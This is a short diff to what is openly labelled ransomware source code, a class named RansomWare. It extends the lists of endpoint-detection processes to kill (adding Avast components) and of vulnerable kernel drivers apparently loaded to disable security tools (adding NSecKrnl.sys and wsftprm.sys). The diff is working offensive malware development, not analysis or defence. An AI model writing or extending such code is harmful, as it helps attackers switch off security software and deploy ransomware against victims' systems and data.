@@ -404,7 +404,9 @@ class RansomWare:
             "PaloAlto.exe",     # Palo Alto Cortex
             "Cortex.exe",
             "Cybereason.exe",   # Cybereason
-            "CybereasonSensor.exe"
+            "CybereasonSensor.exe",
+            "AvastUI.exe",
+            "uiWatchDog.exe"
         ]
         
         print(f"[*] Scanning and killing EDR processes using {device_name}")
@@ -729,6 +731,8 @@ class RansomWare:
             {"name": "hlpdrv.sys", "service": "hlpdrv", "device": "hlpdrv"},
             {"name": "zamguard64.sys", "service": "zam", "device": "zam"},
             {"name": "gdrv.sys", "service": "gdrv", "device": "gdrv"},
+            {"name": "NSecKrnl.sys", "service": "NSecKrnl", "description": "Reynolds style"},
+            {"name": "wsftprm.sys", "service": "wsftprm"},
         ]
 
         for drv in drivers:
